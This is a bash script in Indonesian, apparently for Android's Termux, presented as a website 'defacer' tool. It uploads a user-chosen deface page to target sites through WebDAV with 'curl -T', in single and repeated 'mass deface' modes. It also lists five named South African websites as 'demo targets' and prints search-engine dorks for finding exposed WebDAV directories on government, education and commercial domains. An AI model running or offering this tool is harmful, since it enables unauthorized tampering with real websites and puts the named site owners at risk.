#bersihkan layar
clear
#memulai tools
sleep 1.0
echo $cyan"welcome in defacer tools"
sleep 1.0
echo $red"silahkan masukkan nama anda"
echo -n "nama : "
read nama
clear
sleep 0.5
figlet welcome |lolcat
figlet $nama |lolcat
sleep 3.0
clear
figlet starting |lolcat
figlet tools |lolcat
sleep 2.0
clear
echo "==================================================" |lolcat
echo $cyan"|Author      : Zx•Legion404" |lolcat
echo $cyan"|Tools       : Tools Defacer" |lolcat
echo $cyan"|Team        : OxygenXpkoit" |lolcat
echo $cyan"|contact me  : 089695410992" |lolcat
echo "==================================================" |lolcat
echo "silahkan pilih metode defacenya"
echo "[1]>sekali deface" |lolcat
echo "[2]>mass deface" |lolcat
echo "[3]>demo target" |lolcat
echo "[4]>dork" |lolcat
read -p "[$nama> : " ex

if [ $ex = 1 ]
then
clear
echo "silahkan beri nama sript deface anda dan  pindahkan script deface anda ke memori internal jangan didalam folder"
echo -n "nama script : " |lolcat
read script
echo "script sudah terlock" |lolcat
echo "silahkan masukkan target anda" |lolcat
echo -n "target : " |lolcat
read target
echo "target sedang di eksekusi harap tunggu :D" |lolcat
sleep 2.0
echo "jika terdapat banyak tulisan berarti gagal ya / not vuln" |lolcat
sleep 1.0
curl -T /storage/emulated/0/$script $target
fi

if [ $ex = 2 ] || [ $ex = 02 ]
then
clear
echo "silahkan beri nama sript deface anda dan  pindahkan script deface anda ke memori internal jangan didalam folder"
echo -n "nama script : " |lolcat
read script
echo "script sudah terlock" |lolcat
echo "silahkan masukkan target anda" |lolcat
echo -n "target : " |lolcat
read target
echo "target sedang di eksekusi harap tunggu :D" |lolcat
sleep 2.0
echo "jika terdapat banyak tulisan berarti gagal ya / not vuln" |lolcat
sleep 1.0
curl -T /storage/emulated/0/$script $target
echo ""
echo "silahkan masukkan target anda" |lolcat
echo -n "target : " |lolcat
read target
echo "target sedang di eksekusi harap tunggu :D" |lolcat
sleep 2.0
echo "jika terdapat banyak tulisan berarti gagal ya / not vuln" |lolcat
sleep 1.0
curl -T /storage/emulated/0/$script $target
echo ""
echo "silahkan masukkan target anda" |lolcat
echo -n "target : " |lolcat
read target
echo "target sedang di eksekusi harap tunggu :D" |lolcat
sleep 2.0
echo "jika terdapat banyak tulisan berarti gagal ya / not vuln" |lolcat
sleep 1.0
curl -T /storage/emulated/0/$script $target
echo ""
echo "silahkan masukkan target anda" |lolcat
echo -n "target : " |lolcat
read target
echo "target sedang di eksekusi harap tunggu :D" |lolcat
sleep 2.0
echo "jika terdapat banyak tulisan berarti gagal ya / not vuln" |lolcat
sleep 1.0
curl -T /storage/emulated/0/$script $target
echo ""
echo "silahkan masukkan target anda" |lolcat
echo -n "target : " |lolcat
read target
echo "target sedang di eksekusi harap tunggu :D" |lolcat
sleep 2.0
echo "jika terdapat banyak tulisan berarti gagal ya / not vuln" |lolcat
sleep 1.0
curl -T /storage/emulated/0/$script $target
echo ""
echo "silahkan masukkan target anda" |lolcat
echo -n "target : " |lolcat
read target
echo "target sedang di eksekusi harap tunggu :D" |lolcat
sleep 2.0
echo "jika terdapat banyak tulisan berarti gagal ya / not vuln" |lolcat
sleep 1.0
curl -T /storage/emulated/0/$script $target
echo ""
echo "silahkan masukkan target anda" |lolcat
echo -n "target : " |lolcat
read target
echo "target sedang di eksekusi harap tunggu :D" |lolcat
sleep 2.0
echo "jika terdapat banyak tulisan berarti gagal ya / not vuln" |lolcat
sleep 1.0
curl -T /storage/emulated/0/$script $target
echo ""
echo "silahkan masukkan target anda" |lolcat
echo -n "target : " |lolcat
read target
echo "target sedang di eksekusi harap tunggu :D" |lolcat
sleep 2.0
echo "jika terdapat banyak tulisan berarti gagal ya / not vuln" |lolcat
sleep 1.0
curl -T /storage/emulated/0/$script $target
fi

if [ $ex = 3 ] || [ $ex = 03 ]
then
clear
echo "http://allpaint.co.za"
echo "http://butterflowers.co.za"
echo "http://colourfactory.co.za"
echo "http://ayk.co.za"
echo "http://contsol.co.za"
echo "selebihnya kalian cari sendiri ya jangan mau disuap mulu awokwowkwokwo"
fi

if [ $ex = 4 ] || [ $ex = 04 ]
then
clear
intitle:"Directory Listing For /" + inurl:webdav tomcat
intitle:"Directory Listing For /" + inurl:webdav
echo "inurl:*.edu/*.asp"
echo "inurl:.gov.*/*.asp"
echo "inurl:*.gov/*.asp"
echo "inurl:.org/*.asp"
echo "inurl:.ag/*.asp"
echo "inurl:.it/*.asp"
echo "inurl:.uk/*.asp"
echo "inurl:.co.il/*.asp"
echo "inurl:.com/*.asp"
echo "inurl:.co.id/*.asp"
echo "inurl:.ah.cn/*.asp"
echo "selebihnya kalian cari sendiri ya gays awokwokwo"
echo "gimana cara mengetahui vuln? tambahin /webdav di belakang link targetnya"
echo "contoh : https://mwmwk.co.li/webdav"
fi
